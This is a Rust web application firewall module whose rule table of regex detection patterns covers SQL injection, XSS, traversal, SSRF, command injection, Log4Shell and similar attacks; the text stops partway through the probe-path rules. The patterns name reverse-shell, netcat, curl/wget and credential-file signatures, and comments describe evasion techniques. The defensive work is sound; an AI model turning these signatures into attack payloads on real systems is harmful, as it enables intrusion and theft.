//! Web Application Firewall (WAF) module
//!
//! Pattern-based request inspection covering OWASP Top 10 (2021) attack vectors:
//!
//! A01 Broken Access Control     — Path traversal, path confusion, scanner probe paths
//! A02 Cryptographic Failures    — (enforced at TLS layer, not WAF layer)
//! A03 Injection                 — SQLi, NoSQLi, command injection, SSTI, expression injection
//! A04 Insecure Design           — (architectural, not WAF-detectable at runtime)
//! A05 Security Misconfiguration — (handled at config validation, not request WAF)
//! A06 Vulnerable Components     — JNDI/Log4Shell lookup injection
//! A07 Auth Failures             — Login brute-force patterns (excessive auth params)
//! A08 Software and Data Integrity — Deserialization (Java/PHP object injection)
//! A09 Logging Failures          — (architectural, not WAF)
//! A10 SSRF                      — SSRF patterns (private IP ranges, metadata endpoints)
//!
//! Additionally covers:
//! - XSS (cross-site scripting)
//! - XXE (XML external entity injection)
//! - Local/remote file inclusion via URL stream wrappers
//! - CRLF injection / HTTP response splitting
//! - JavaScript prototype pollution
//! - GraphQL schema introspection
//! - Request smuggling and header anomalies (structural, not regex)
//! - User-defined custom patterns
//!
//! # Engine design
//!
//! Every rule lives in one static table ([`RULES`]) carrying a stable identifier
//! (`PQW-<CATEGORY>-<NNN>`), a category, a severity and the target it applies to.
//! Identifiers are what appear in logs, audit records and metrics — the engine
//! used to name a rule by the first 40 characters of its own regex source, which
//! made every log line unstable against pattern edits and leaked the ruleset to
//! anyone who could read a 403.
//!
//! Rules are compiled into per-scope [`RegexSet`]s, so one pass over an input
//! evaluates every pattern for that scope simultaneously rather than looping a
//! `Vec<Regex>`. This is also what makes anomaly scoring affordable: the engine
//! sees *all* rules a request triggers, not just the first.
//!
//! # Scoring
//!
//! A match contributes its severity's score (Low 3, Medium 5, High 8, Critical
//! 10). A request is blocked when the accumulated score reaches
//! `waf.anomaly_threshold` (default 5). At that default any single Medium or
//! higher rule blocks on its own — the historical behaviour — while genuinely
//! ambiguous signals are Low and need corroboration before they cost a visitor a
//! 403. That is the tuning knob the old first-match-wins engine did not have:
//! `(?i)localhost` in a query string was a 403 by itself.

use std::sync::atomic::{AtomicU64, Ordering};

use axum::http::HeaderMap;
use percent_encoding::percent_decode_str;
use regex::{Regex, RegexSet, RegexSetBuilder};
use tracing::debug;

use crate::config::WafConfig;

/// Severity of a WAF rule match
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    /// Below the corroboration floor: a bare indicator that is only meaningful
    /// alongside a real attack vector (e.g. a loopback address mentioned in
    /// prose). Several together still do not reach the block threshold.
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    /// Anomaly score contributed by one match at this severity.
    ///
    /// Medium equals the default threshold so a single Medium rule blocks by
    /// itself. Low is below the threshold but more than half of it, so one weak
    /// signal is never enough and two corroborating ones are.
    pub const fn score(self) -> u32 {
        match self {
            Severity::Info => 1,
            Severity::Low => 3,
            Severity::Medium => 5,
            Severity::High => 8,
            Severity::Critical => 10,
        }
    }

    pub const fn as_str(self) -> &'static str {
        match self {
            Severity::Info => "info",
            Severity::Low => "low",
            Severity::Medium => "medium",
            Severity::High => "high",
            Severity::Critical => "critical",
        }
    }
}

/// Rule category. Each maps to a config toggle so a category can be tuned off
/// without editing patterns.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Category {
    Sqli,
    Xss,
    PathTraversal,
    NoSqli,
    Ssrf,
    CmdInjection,
    Xxe,
    Deserialization,
    Jndi,
    Ssti,
    FileInclusion,
    CrlfInjection,
    ProtoPollution,
    GraphQl,
    ScannerProbe,
    BadBotUa,
    Anomaly,
    Custom,
}

impl Category {
    pub const fn as_str(self) -> &'static str {
        match self {
            Category::Sqli => "sqli",
            Category::Xss => "xss",
            Category::PathTraversal => "path-traversal",
            Category::NoSqli => "nosqli",
            Category::Ssrf => "ssrf",
            Category::CmdInjection => "cmd-injection",
            Category::Xxe => "xxe",
            Category::Deserialization => "deser",
            Category::Jndi => "jndi",
            Category::Ssti => "ssti",
            Category::FileInclusion => "file-inclusion",
            Category::CrlfInjection => "crlf-injection",
            Category::ProtoPollution => "proto-pollution",
            Category::GraphQl => "graphql",
            Category::ScannerProbe => "scanner-probe",
            Category::BadBotUa => "bad-bot-ua",
            Category::Anomaly => "request-anomaly",
            Category::Custom => "custom",
        }
    }

    /// Whether this category is switched on in config.
    fn enabled(self, config: &WafConfig) -> bool {
        match self {
            Category::Sqli => config.sqli,
            Category::Xss => config.xss,
            Category::PathTraversal => config.path_traversal,
            Category::NoSqli => config.nosqli,
            Category::Ssrf => config.ssrf,
            Category::CmdInjection => config.cmd_injection,
            Category::Xxe => config.xxe,
            Category::Deserialization => config.deserialization,
            Category::Jndi => config.jndi,
            Category::Ssti => config.ssti,
            Category::FileInclusion => config.file_inclusion,
            Category::CrlfInjection => config.crlf_injection,
            Category::ProtoPollution => config.proto_pollution,
            Category::GraphQl => config.graphql,
            Category::ScannerProbe => config.scanner_probe,
            Category::BadBotUa => config.block_scanner_uas,
            Category::Anomaly => config.request_anomaly,
            Category::Custom => true,
        }
    }
}

/// Which part of a request a rule is evaluated against.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// Path, query, scanned headers and body — the general payload surface.
    Payload,
    /// Request path only. Used for probe paths, where the path *is* the signal
    /// and matching the same string in a query parameter would be a false alarm.
    Path,
    /// User-Agent header only.
    UserAgent,
}

/// One rule in the static table.
struct RuleDef {
    id: &'static str,
    category: Category,
    severity: Severity,
    scope: Scope,
    pattern: &'static str,
}

impl RuleDef {
    const fn payload(
        id: &'static str,
        category: Category,
        severity: Severity,
        pattern: &'static str,
    ) -> Self {
        Self {
            id,
            category,
            severity,
            scope: Scope::Payload,
            pattern,
        }
    }

    const fn path(id: &'static str, severity: Severity, pattern: &'static str) -> Self {
        Self {
            id,
            category: Category::ScannerProbe,
            severity,
            scope: Scope::Path,
            pattern,
        }
    }

    const fn ua(id: &'static str, severity: Severity, pattern: &'static str) -> Self {
        Self {
            id,
            category: Category::BadBotUa,
            severity,
            scope: Scope::UserAgent,
            pattern,
        }
    }
}

/// Payload rules — evaluated against path, query, scanned headers and body.
///
/// Identifiers are stable and must not be reused for a different rule: they are
/// referenced by `waf.exclusions` in operator config and appear as metric
/// labels. Retire an identifier rather than repurposing it.
#[rustfmt::skip]
const PAYLOAD_RULES: &[RuleDef] = &[
    // ---------------------------------------------------------------------
    // A03 — SQL injection
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-SQLI-001", Category::Sqli, Severity::High,
        r"(?i)(\b(union\s+select|select\s+.*\s+from|insert\s+into|delete\s+from|drop\s+(table|database)|alter\s+table|exec(\s|\()|execute\s*\()\b)"),
    RuleDef::payload("PQW-SQLI-002", Category::Sqli, Severity::High,
        r#"(?i)('|")\s*(or|and)\s+('|")?\d+('|")?\s*=\s*('|")?\d+"#),
    RuleDef::payload("PQW-SQLI-003", Category::Sqli, Severity::High,
        r"(?i)\bor\s+1\s*=\s*1"),
    RuleDef::payload("PQW-SQLI-004", Category::Sqli, Severity::High,
        r"(?i)\b(sleep|benchmark|waitfor\s+delay)\s*\("),
    RuleDef::payload("PQW-SQLI-005", Category::Sqli, Severity::High,
        r"(?i)(;|--)\s*(drop|select|insert|update|delete|create|alter)"),
    // Quoted-string equality. Ambiguous enough to appear in prose and in JSON
    // payloads, so it corroborates rather than blocks alone.
    RuleDef::payload("PQW-SQLI-006", Category::Sqli, Severity::Low,
        r"'[^']*'(\s*(or|and)\s+'[^']*')*\s*=\s*'"),
    RuleDef::payload("PQW-SQLI-007", Category::Sqli, Severity::High,
        r"(?i)\b(information_schema|sys\.tables|sysobjects|syscolumns)\b"),
    RuleDef::payload("PQW-SQLI-008", Category::Sqli, Severity::Critical,
        r"(?i)(xp_cmdshell|sp_execute|sp_executesql)"),
    RuleDef::payload("PQW-SQLI-009", Category::Sqli, Severity::High,
        r"(?i)\bload_file\s*\("),
    RuleDef::payload("PQW-SQLI-010", Category::Sqli, Severity::Critical,
        r"(?i)\binto\s+(outfile|dumpfile)\s+"),
    // SQL comment evasion: OR/AND separated by /**/ or /*!...*/ or + (MySQL)
    RuleDef::payload("PQW-SQLI-011", Category::Sqli, Severity::High,
        r"(?i)'\s*(/\*.*?\*/|/\*!.*?\*/|\+)\s*(or|and)\s*(/\*.*?\*/|\+)?\s*['\d]"),
    // MySQL conditional comments executing SQL keywords: /*!OR*/ /*!UNION*/ etc.
    RuleDef::payload("PQW-SQLI-012", Category::Sqli, Severity::High,
        r"(?i)/\*!\s*(or|and|union|select|insert|delete|drop|update|exec|execute)\s*\*/"),
    // Encoded whitespace (newline/tab) as SQL token separator: 1'%0aOR%0a1=1
    RuleDef::payload("PQW-SQLI-013", Category::Sqli, Severity::High,
        r"(?i)'(%0[ad]|%09|\s)+(or|and)(%0[ad]|%09|\s)+['\d]"),
    // Trailing SQL comment injection: auth bypass via 'admin'-- or username'--
    RuleDef::payload("PQW-SQLI-014", Category::Sqli, Severity::Medium,
        r"(?i)'\s*(-{2}|#)\s*$"),
    RuleDef::payload("PQW-SQLI-015", Category::Sqli, Severity::Medium,
        r"(?i)'\s*(-{2}|#)\s+"),
    // Stacked-query and time-based blind probes not covered above.
    RuleDef::payload("PQW-SQLI-016", Category::Sqli, Severity::High,
        r"(?i)\b(pg_sleep|dbms_pipe\.receive_message|utl_inaddr|utl_http)\s*\("),
    RuleDef::payload("PQW-SQLI-017", Category::Sqli, Severity::High,
        r"(?i)\b(extractvalue|updatexml)\s*\(\s*\d*\s*,"),
    RuleDef::payload("PQW-SQLI-018", Category::Sqli, Severity::High,
        r"(?i)\bunion\b[\s\S]{0,32}?\ball\b[\s\S]{0,32}?\bselect\b"),

    // ---------------------------------------------------------------------
    // XSS
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-XSS-001", Category::Xss, Severity::Medium, r"(?i)<\s*script[^>]*>"),
    RuleDef::payload("PQW-XSS-002", Category::Xss, Severity::Medium, r"(?i)</\s*script\s*>"),
    RuleDef::payload("PQW-XSS-003", Category::Xss, Severity::Medium, r"(?i)\bjavascript\s*:"),
    RuleDef::payload("PQW-XSS-004", Category::Xss, Severity::Medium,
        r"(?i)\bon(error|load|click|mouseover|focus|blur|change|submit|reset|select|keydown|keyup|keypress|mousedown|mouseup|mousemove|dblclick|contextmenu|drag|drop|scroll|resize|unload|beforeunload|hashchange|popstate|message|storage|online|offline|pagehide|pageshow|visibilitychange)\s*="),
    RuleDef::payload("PQW-XSS-005", Category::Xss, Severity::Medium, r"(?i)\beval\s*\("),
    RuleDef::payload("PQW-XSS-006", Category::Xss, Severity::Medium,
        r"(?i)\bdocument\.(cookie|write|location)"),
    RuleDef::payload("PQW-XSS-007", Category::Xss, Severity::Medium,
        r"(?i)\bwindow\.(location|open|eval)"),
    RuleDef::payload("PQW-XSS-008", Category::Xss, Severity::High,
        r#"(?i)<\s*(img|iframe|object|embed|link|meta|style|body|input|form|a)\s[^>]*\b(src|href|data|action|formaction)\s*=\s*['"]?\s*javascript:"#),
    RuleDef::payload("PQW-XSS-009", Category::Xss, Severity::Medium, r"(?i)expression\s*\("),
    RuleDef::payload("PQW-XSS-010", Category::Xss, Severity::Medium, r"(?i)vbscript\s*:"),
    RuleDef::payload("PQW-XSS-011", Category::Xss, Severity::High,
        r"(?i)<\s*svg[^>]*>.*\bon\w+\s*="),
    RuleDef::payload("PQW-XSS-012", Category::Xss, Severity::Medium, r"(?i)data\s*:\s*text/html"),
    // Modern event handlers absent from the 2021-era list above. Pointer,
    // animation and transition events fire without user interaction and are the
    // current standard bypass for handler allowlists built from the old set.
    RuleDef::payload("PQW-XSS-013", Category::Xss, Severity::Medium,
        r"(?i)\bon(pointer(down|up|over|out|enter|leave|move|cancel)|animation(start|end|iteration)|transition(start|end|run|cancel)|toggle|beforeinput|input|invalid|wheel|auxclick|securitypolicyviolation|formdata|slotchange|cuechange|ended|playing|waiting|loadstart|loadedmetadata)\s*="),
    // srcdoc smuggles a whole document past attribute-level filters.
    RuleDef::payload("PQW-XSS-014", Category::Xss, Severity::High,
        r"(?i)<[^>]*\bsrcdoc\s*="),
    // <base href> rebases every relative URL on the page onto an attacker host.
    RuleDef::payload("PQW-XSS-015", Category::Xss, Severity::High,
        r"(?i)<\s*base\s[^>]*\bhref\s*="),
    RuleDef::payload("PQW-XSS-016", Category::Xss, Severity::Medium,
        r"(?i)\bString\.fromCharCode\s*\("),
    RuleDef::payload("PQW-XSS-017", Category::Xss, Severity::Medium,
        r"(?i)<\s*(iframe|object|embed|template|portal)[\s>]"),
    RuleDef::payload("PQW-XSS-018", Category::Xss, Severity::Medium,
        r"(?i)\b(atob|unescape|decodeURIComponent)\s*\(\s*['\x22]"),

    // ---------------------------------------------------------------------
    // A01 — Path traversal and path confusion
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-TRAV-001", Category::PathTraversal, Severity::High, r"\.\./"),
    RuleDef::payload("PQW-TRAV-002", Category::PathTraversal, Severity::High, r"\.\.\\"),
    RuleDef::payload("PQW-TRAV-003", Category::PathTraversal, Severity::High, r"(?i)%2e%2e[%/\\]"),
    RuleDef::payload("PQW-TRAV-004", Category::PathTraversal, Severity::High,
        r"(?i)%252e%252e[%/\\]"),
    RuleDef::payload("PQW-TRAV-005", Category::PathTraversal, Severity::High, r"\x00"),
    RuleDef::payload("PQW-TRAV-006", Category::PathTraversal, Severity::High, r"(?i)%00"),
    RuleDef::payload("PQW-TRAV-007", Category::PathTraversal, Severity::High, r"(?i)(\.\./){2,}"),
    RuleDef::payload("PQW-TRAV-008", Category::PathTraversal, Severity::High, r"(?i)(\.\.%2f){2,}"),
    RuleDef::payload("PQW-TRAV-009", Category::PathTraversal, Severity::High, r"(?i)(\.\.%5c){2,}"),
    // Overlong UTF-8 encodings of '.' and '/' — the IIS/Tomcat unicode bypass.
    RuleDef::payload("PQW-TRAV-010", Category::PathTraversal, Severity::High,
        r"(?i)%c0%ae%c0%ae"),
    RuleDef::payload("PQW-TRAV-011", Category::PathTraversal, Severity::High,
        r"(?i)%(c0%af|c1%9c|e0%80%af|c0%2f|c0%5c)"),
    RuleDef::payload("PQW-TRAV-012", Category::PathTraversal, Severity::High,
        r"(?i)%u(002e|002f|005c|ff0e|2215)"),
    // Path-parameter confusion: `..;/` reaches a parent segment on containers
    // that strip `;`-parameters after the security filter has run.
    RuleDef::payload("PQW-TRAV-013", Category::PathTraversal, Severity::High,
        r"(?i)\.\.;[/\\]"),
    // Named targets. High signal on their own — nothing legitimate here asks
    // for /etc/shadow.
    RuleDef::payload("PQW-TRAV-014", Category::PathTraversal, Severity::Critical,
        r"(?i)/etc/(passwd|shadow|group|hosts|hostname|shells)\b"),
    RuleDef::payload("PQW-TRAV-015", Category::PathTraversal, Severity::Critical,
        r"(?i)[/\\](windows|winnt)[/\\](win\.ini|system32|system\.ini)"),
    RuleDef::payload("PQW-TRAV-016", Category::PathTraversal, Severity::High,
        r"(?i)/proc/self/(environ|cmdline|fd)"),

    // ---------------------------------------------------------------------
    // A03 — NoSQL injection
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-NOSQL-001", Category::NoSqli, Severity::Medium,
        r"(?i)\$\s*(where|gt|gte|lt|lte|ne|eq|in|nin|or|and|not|nor|exists|type|mod|regex|text)\b"),
    RuleDef::payload("PQW-NOSQL-002", Category::NoSqli, Severity::Medium,
        r"(?i)\$\s*regex\s*[:\{]"),
    RuleDef::payload("PQW-NOSQL-003", Category::NoSqli, Severity::Medium,
        r#"\{\s*"\$[a-zA-Z]+"\s*:"#),
    RuleDef::payload("PQW-NOSQL-004", Category::NoSqli, Severity::High,
        r"(?i)\$\s*javascript\s*:"),
    RuleDef::payload("PQW-NOSQL-005", Category::NoSqli, Severity::High,
        r"(?i)\$\s*accumulator\s*[:\{]"),
    RuleDef::payload("PQW-NOSQL-006", Category::NoSqli, Severity::High,
        r"(?i)\$\s*function\s*[:\{]"),

    // ---------------------------------------------------------------------
    // A10 — SSRF
    // ---------------------------------------------------------------------
    // Link-local and cloud metadata: unambiguous, blocks alone.
    RuleDef::payload("PQW-SSRF-001", Category::Ssrf, Severity::Critical, r"169\.254\.169\.254"),
    RuleDef::payload("PQW-SSRF-002", Category::Ssrf, Severity::High, r"(?i)169\.254\."),
    RuleDef::payload("PQW-SSRF-003", Category::Ssrf, Severity::Critical,
        r"(?i)metadata\.(google\.internal|azure\.com|oraclecloud\.com)"),
    RuleDef::payload("PQW-SSRF-004", Category::Ssrf, Severity::Critical, r"100\.100\.100\.200"),
    // Non-HTTP URL schemes in a parameter.
    RuleDef::payload("PQW-SSRF-005", Category::Ssrf, Severity::High, r"(?i)file\s*://"),
    RuleDef::payload("PQW-SSRF-006", Category::Ssrf, Severity::High, r"(?i)dict\s*://"),
    RuleDef::payload("PQW-SSRF-007", Category::Ssrf, Severity::High, r"(?i)gopher\s*://"),
    RuleDef::payload("PQW-SSRF-008", Category::Ssrf, Severity::Medium, r"(?i)\bldaps?\s*://"),
    RuleDef::payload("PQW-SSRF-009", Category::Ssrf, Severity::Medium, r"(?i)\bftps?\s*://"),
    // Loopback in its various spellings. Individually weak — "localhost" occurs
    // in documentation, changelogs and support tickets, and blocking on it alone
    // was a standing false-positive source — so these corroborate.
    RuleDef::payload("PQW-SSRF-010", Category::Ssrf, Severity::Info, r"127\.\d+\.\d+\.\d+"),
    RuleDef::payload("PQW-SSRF-011", Category::Ssrf, Severity::Info, r"\[::1\]"),
    RuleDef::payload("PQW-SSRF-012", Category::Ssrf, Severity::Info, r"(?i)localhost"),
    RuleDef::payload("PQW-SSRF-013", Category::Ssrf, Severity::Medium, r"(?i)0x7f0{0,4}0001"),
    RuleDef::payload("PQW-SSRF-014", Category::Ssrf, Severity::Medium, r"\b2130706433\b"),
    RuleDef::payload("PQW-SSRF-015", Category::Ssrf, Severity::Medium, r"(?i)\b0177\.0\.0\.1\b"),
    RuleDef::payload("PQW-SSRF-016", Category::Ssrf, Severity::Medium,
        r"(?i)\[::ffff:(127|10|192\.168|169\.254)\."),

    // ---------------------------------------------------------------------
    // A03 — OS command injection
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-CMD-001", Category::CmdInjection, Severity::Critical,
        r"(?i)(;|\||`|&&|\|\|)\s*(ls|cat|id|whoami|uname|nc|curl|wget|bash|sh|cmd|powershell|python|perl|ruby|php|nmap|ping|traceroute)\b"),
    // Command substitution. `$(...)` and backticks appear in shell examples,
    // CI logs and template syntax, so they corroborate rather than block alone.
    RuleDef::payload("PQW-CMD-002", Category::CmdInjection, Severity::Low, r"\$\s*\([^)]*\)"),
    RuleDef::payload("PQW-CMD-003", Category::CmdInjection, Severity::Low, r"`[^`]+`"),
    RuleDef::payload("PQW-CMD-004", Category::CmdInjection, Severity::High, r"(?i)\bsystem\s*\("),
    RuleDef::payload("PQW-CMD-005", Category::CmdInjection, Severity::High, r"(?i)\bpassthru\s*\("),
    RuleDef::payload("PQW-CMD-006", Category::CmdInjection, Severity::Critical,
        r"(?i)\bshell_exec\s*\("),
    RuleDef::payload("PQW-CMD-007", Category::CmdInjection, Severity::High, r"(?i)\bpopen\s*\("),
    RuleDef::payload("PQW-CMD-008", Category::CmdInjection, Severity::High,
        r"(?i)\bproc_open\s*\("),
    // Bare `exec(` is a substring of ordinary programming prose and of the
    // regex/JS documentation this site publishes. Low so it needs company.
    RuleDef::payload("PQW-CMD-009", Category::CmdInjection, Severity::Low, r"(?i)\bexec\s*\("),
    // Shell metacharacter tricks used to defeat space and keyword filters.
    RuleDef::payload("PQW-CMD-010", Category::CmdInjection, Severity::Critical,
        r"(?i)\$\{IFS\}"),
    RuleDef::payload("PQW-CMD-011", Category::CmdInjection, Severity::Critical,
        r"(?i)\bnc\s+(-[a-z]*e[a-z]*)\s"),
    RuleDef::payload("PQW-CMD-012", Category::CmdInjection, Severity::High,
        r"(?i)[;|&]\s*(rm|mv|chmod|chown|kill|dd|mkfifo)\s+-"),
    RuleDef::payload("PQW-CMD-013", Category::CmdInjection, Severity::High,
        r"(?i)\|\s*(base64|xxd|od|openssl)\b"),
    RuleDef::payload("PQW-CMD-014", Category::CmdInjection, Severity::Critical,
        r"(?i)\b(bash|sh)\s+-i\s+>&\s*/dev/(tcp|udp)/"),
    // A command-substitution wrapper around a recognised command is
    // unambiguous — `$(id)`, `` `whoami` ``, `${cat}` — unlike the bare
    // substitution syntax above, which appears in shell docs and stays Low.
    RuleDef::payload("PQW-CMD-015", Category::CmdInjection, Severity::High,
        r"(?i)[$`]\{?\(?\s*(id|whoami|uname|hostname|pwd|cat|ls|dir|env|set|ps|netstat|ifconfig|ip|curl|wget|nc|ncat|bash|sh|zsh|python[0-9]?|perl|ruby|php|powershell)\b"),

    // ---------------------------------------------------------------------
    // A08 — XXE
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-XXE-001", Category::Xxe, Severity::High, r"(?i)<!ENTITY"),
    RuleDef::payload("PQW-XXE-002", Category::Xxe, Severity::Critical,
        r#"(?i)SYSTEM\s+['"]file://"#),
    RuleDef::payload("PQW-XXE-003", Category::Xxe, Severity::High,
        r#"(?i)SYSTEM\s+['"]https?://"#),
    RuleDef::payload("PQW-XXE-004", Category::Xxe, Severity::High, r"(?i)<!DOCTYPE[^>]+\["),
    // A bare parameter-entity reference is indistinguishable from ordinary text
    // containing a percent sign followed by a word and a semicolon, so it only
    // counts when something else also matches.
    RuleDef::payload("PQW-XXE-005", Category::Xxe, Severity::Low,
        r"(?i)%[a-zA-Z][a-zA-Z0-9]*;"),

    // ---------------------------------------------------------------------
    // A08 — Insecure deserialization
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-DESER-001", Category::Deserialization, Severity::Critical, r"rO0AB"),
    RuleDef::payload("PQW-DESER-002", Category::Deserialization, Severity::Critical,
        r#"(?i)O:\d+:"[a-zA-Z_][a-zA-Z0-9_\\]*""#),
    RuleDef::payload("PQW-DESER-003", Category::Deserialization, Severity::Critical,
        r"(?i)aced0005"),
    RuleDef::payload("PQW-DESER-004", Category::Deserialization, Severity::Critical,
        r"(?i)java\.lang\.(Runtime|ProcessBuilder|Class)"),
    RuleDef::payload("PQW-DESER-005", Category::Deserialization, Severity::High,
        r"(?i)sun\.reflect\."),
    RuleDef::payload("PQW-DESER-006", Category::Deserialization, Severity::High,
        r"(?i)com\.sun\.org\.apache\.xml\.internal\.security\.utils\.Base64"),
    RuleDef::payload("PQW-DESER-007", Category::Deserialization, Severity::Critical,
        r"(?i)(org\.apache\.commons\.collections|com\.thoughtworks\.xstream|org\.springframework\.beans\.factory\.config\.PropertyPathFactoryBean)"),
    RuleDef::payload("PQW-DESER-008", Category::Deserialization, Severity::High,
        r"(?i)(__reduce__|__reduce_ex__|pickle\.loads|cPickle)"),
    RuleDef::payload("PQW-DESER-009", Category::Deserialization, Severity::High,
        r"(?i)!!(python/object|ruby/object|com\.sun)"),

    // ---------------------------------------------------------------------
    // A06 — JNDI / expression-language injection (Log4Shell and relatives)
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-JNDI-001", Category::Jndi, Severity::Critical, r"(?i)\$\{\s*jndi\s*:"),
    RuleDef::payload("PQW-JNDI-002", Category::Jndi, Severity::Critical,
        r"(?i)\$\{[^}]*\b(ldaps?|rmi|dns|iiop|corba|nis|nds|http)\s*:"),
    // Nested lookups exist only to obfuscate: ${${lower:j}ndi:...}
    RuleDef::payload("PQW-JNDI-003", Category::Jndi, Severity::Critical, r"\$\{[^}]*\$\{"),
    RuleDef::payload("PQW-JNDI-004", Category::Jndi, Severity::High,
        r"(?i)\$\{\s*(env|sys|java|lower|upper|date|ctx|main|jvmrunargs|sd|k8s|web|docker|spring|bundle)\s*:"),
    // OGNL / SpEL, as used against Struts2 and Spring.
    RuleDef::payload("PQW-JNDI-005", Category::Jndi, Severity::High,
        r"(?i)%\{[^}]*(@|#)[a-z]"),
    RuleDef::payload("PQW-JNDI-006", Category::Jndi, Severity::High,
        r"(?i)#\{[^}]*(T\(|new\s+|\.getClass\(|getRuntime)"),
    RuleDef::payload("PQW-JNDI-007", Category::Jndi, Severity::Critical,
        r"(?i)(ognl|_memberAccess|\bContext\.getRuntime)"),

    // ---------------------------------------------------------------------
    // A03 — Server-side template injection
    // ---------------------------------------------------------------------
    // Sandbox-escape internals. Nothing legitimate references __subclasses__.
    RuleDef::payload("PQW-SSTI-001", Category::Ssti, Severity::Critical,
        r"(?i)__(class|mro|subclasses|globals|builtins|import|base|init)__"),
    RuleDef::payload("PQW-SSTI-002", Category::Ssti, Severity::High,
        r"(?i)\{\{\s*(config|self|request|session|url_for|cycler|joiner|namespace|lipsum|get_flashed_messages|application)\b"),
    // The canonical arithmetic probe: {{7*7}}.
    RuleDef::payload("PQW-SSTI-003", Category::Ssti, Severity::Medium,
        r"\{\{\s*\d+\s*[*+\-/]\s*\d+\s*\}\}"),
    RuleDef::payload("PQW-SSTI-004", Category::Ssti, Severity::Medium,
        r"(?i)\{%\s*(import|include|extends|set|for|if|with|debug)\b"),
    RuleDef::payload("PQW-SSTI-005", Category::Ssti, Severity::High,
        r"(?i)<%=?\s*(system|exec|require|eval|Runtime|ProcessBuilder)\b"),
    // PHP-family template engines (Smarty, Twig, Blade) — {php}...{/php},
    // {$smarty.*}, Twig {{dump()}}, Smarty/Blade block tags {if}...{/if}.
    RuleDef::payload("PQW-SSTI-006", Category::Ssti, Severity::Critical,
        r"(?i)\{\s*/?\s*php\s*\}"),
    RuleDef::payload("PQW-SSTI-007", Category::Ssti, Severity::High,
        r"(?i)\{\$smarty\.(version|template|current_dir|ldelim|rdelim|now|const|config|session|server|get|post|cookies|request|capture)\b"),
    RuleDef::payload("PQW-SSTI-008", Category::Ssti, Severity::High,
        r"(?i)\{\{\s*(dump|include|source|attribute|constant|max|min|range|block|template_from_string)\s*\("),
    RuleDef::payload("PQW-SSTI-009", Category::Ssti, Severity::Medium,
        r"(?i)\{\s*/(if|foreach|section|for|while|block|literal|capture|strip)\s*\}"),

    // ---------------------------------------------------------------------
    // Local / remote file inclusion via URL stream wrappers
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-LFI-001", Category::FileInclusion, Severity::Critical,
        r"(?i)\bphp://(filter|input|stdin|memory|temp|fd)"),
    RuleDef::payload("PQW-LFI-002", Category::FileInclusion, Severity::Critical,
        r"(?i)\bexpect://"),
    RuleDef::payload("PQW-LFI-003", Category::FileInclusion, Severity::High,
        r"(?i)\b(zip|phar|compress\.(zlib|bzip2))://"),
    RuleDef::payload("PQW-LFI-004", Category::FileInclusion, Severity::High,
        r"(?i)\bdata://text/plain"),
    RuleDef::payload("PQW-LFI-005", Category::FileInclusion, Severity::High,
        r"(?i)convert\.(base64-(en|de)code|iconv\.)"),
    RuleDef::payload("PQW-LFI-006", Category::FileInclusion, Severity::Medium,
        r"(?i)\bglob://"),

    // ---------------------------------------------------------------------
    // CRLF injection / HTTP response splitting
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-CRLF-001", Category::CrlfInjection, Severity::High,
        r"(?i)%0d%0a|%0a%0d|%250d%250a"),
    RuleDef::payload("PQW-CRLF-002", Category::CrlfInjection, Severity::Critical,
        r"(?i)(\r\n|%0d%0a|%0a|\n)\s*(set-cookie|location|content-length|content-type|refresh|link)\s*:"),
    RuleDef::payload("PQW-CRLF-003", Category::CrlfInjection, Severity::Medium, r"\r\n"),

    // ---------------------------------------------------------------------
    // JavaScript prototype pollution
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-PROTO-001", Category::ProtoPollution, Severity::High, r"(?i)__proto__"),
    RuleDef::payload("PQW-PROTO-002", Category::ProtoPollution, Severity::High,
        r#"(?i)constructor\s*(\[\s*['"]prototype|\.\s*prototype)"#),
    RuleDef::payload("PQW-PROTO-003", Category::ProtoPollution, Severity::Medium,
        r#"(?i)"prototype"\s*:\s*\{"#),

    // ---------------------------------------------------------------------
    // GraphQL introspection (off by default — legitimate for public schemas)
    // ---------------------------------------------------------------------
    RuleDef::payload("PQW-GQL-001", Category::GraphQl, Severity::Medium, r"\b__schema\b"),
    RuleDef::payload("PQW-GQL-002", Category::GraphQl, Severity::Medium, r"\b__type\s*\("),
];

/// Scanner / reconnaissance probe paths — matched against `req.path` only.
///
/// These paths have no legitimate use here, and matching them in a query string
/// or body instead would fire on any page that merely *discusses* them (this
/// site publishes security documentation that names most of them).
#[rustfmt::skip]
const PATH_RULES: &[RuleDef] = &[
    // Version control / source leakage
    RuleDef::path("PQW-PROBE-001", Severity::Medium, r"(?i)(^|/)\.git(/|$)"),
    RuleDef::path("PQW-PROBE-002", Severity::Medium, r"(?i)(^|/)\.svn(/|$)"),
    RuleDef::path("PQW-PROBE-003", Severity::Medium, r"(?i)(^|/)\.hg(/|$)"),
    RuleDef::path("PQW-PROBE-004", Severity::Medium, r"(?i)(^|/)\.bzr(/|$)"),
    RuleDef::path("PQW-PROBE-005", Severity::High,   r"(?i)(^|/)\.git-credentials$"),
    // Environment / secrets
    RuleDef::path("PQW-PROBE-010", Severity::High,   r"(?i)(^|/)\.env($|[\./])"),
    RuleDef::path("PQW-PROBE-011", Severity::High,
        r"(?i)(^|/)\.env\.(local|production|staging|dev|test|example)$"),
    RuleDef::path("PQW-PROBE-012", Severity::Medium, r"(?i)(^|/)\.npmrc$"),
    RuleDef::path("PQW-PROBE-013", Severity::High,   r"(?i)(^|/)secrets\.(yml|yaml|json)$"),
    // Cloud provider credentials / metadata
    RuleDef::path("PQW-PROBE-020", Severity::High,   r"(?i)(^|/)\.aws(/|$)"),
    RuleDef::path("PQW-PROBE-021", Severity::High,   r"(?i)(^|/)\.gcloud(/|$)"),
    RuleDef::path("PQW-PROBE-022", Severity::Medium, r"(?i)(^|/)\.dockerenv$"),
    // Infrastructure-as-code state / config
